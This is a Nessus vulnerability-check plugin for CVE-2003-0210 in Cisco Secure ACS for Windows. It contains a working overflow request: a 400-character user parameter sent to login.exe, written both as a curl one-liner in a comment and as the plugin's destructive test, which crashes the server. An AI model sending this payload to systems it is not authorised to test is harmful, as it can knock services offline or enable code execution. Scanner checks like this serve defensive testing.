#
# This script was written by Xue Yong Zhi <xueyong@udel.edu>
# Rewritten by Tenable Network Security, Inc.
#
# See the Nessus Scripts License for details
#
# References:
# NSFOCUS SA2003-04
# curl -i "http://host:2002/login.exe?user=`perl -e "print ('a'x400)"`&reply=any&id=1"
########################

include("compat.inc");

if (description)
{
 script_id(11556);
 script_version("$Revision: 1.24 $");
 script_cvs_date("$Date: 2017/05/10 19:18:33 $");

 script_cve_id("CVE-2003-0210");
 script_bugtraq_id(7413);
 script_osvdb_id(1568);
 script_xref(name:"CERT", value:"697049");
 script_xref(name:"NSFOCUS", value:"SA2003-04");

 script_name(english:"CiscoSecure ACS for Windows CSAdmin Login Overflow DoS");
 script_summary(english:"CISCO Secure ACS Management Interface Login Overflow");

 script_set_attribute(attribute:"synopsis", value:"Arbitrary code may be executed on the remote host.");
 script_set_attribute(attribute:"description", value:
"The remote web server crashed when the 'login.exe' CGI received a too
login query string. This leads to a denial of service or even
execution of arbitrary code. Some versions of Cisco Secure ACS web
server are known to be vulnerable to this flaw.");
 # https://web.archive.org/web/20030425095257/http://www.cisco.com/warp/public/707/cisco-sa-20030423-ACS.shtml
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?9a387006");
 script_set_attribute(attribute:"solution", value:"Install ACS for Windows versions 3.0.4, 3.1.2, or later");
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:U/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"No known exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"false");

 script_set_attribute(attribute:"vuln_publication_date", value:"2003/04/23");
 script_set_attribute(attribute:"patch_publication_date", value:"2003/04/23");
 script_set_attribute(attribute:"plugin_publication_date", value:"2003/04/30");

 script_set_attribute(attribute:"potential_vulnerability", value:"true");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_set_attribute(attribute:"cpe", value:"cpe:/a:cisco:secure_access_control_server");
 script_end_attributes();

 script_category(ACT_DESTRUCTIVE_ATTACK);

 script_copyright(english:"This script is Copyright (C) 2003-2017 Xue Yong Zhi & Tenable Network Security, Inc.");
 script_family(english:"Web Servers");

 script_dependencie("http_version.nasl");
 script_require_keys("Settings/ParanoidReport");
 script_require_ports("Services/www", 2002);

 exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

function test(port)
{
  local_var	r;
  if ( http_is_dead(port:port) ||
       # http_is_broken(port: port)||
       ! is_cgi_installed3(item: "/login.exe", port: port))
     return 0;
  r = http_send_recv3(port: port, method: "GET", item: strcat("/login.exe?user=", crap(400), "&reply=any&id=1"));
  if (isnull(r)) return NULL;
  if (http_is_dead(port: port, retry:3))
  {
    security_hole(port);
    return 1;
  }
}

if (report_paranoia < 2) audit(AUDIT_PARANOID);

port = get_http_port(default: 2002, embedded: 1);
test(port: port);
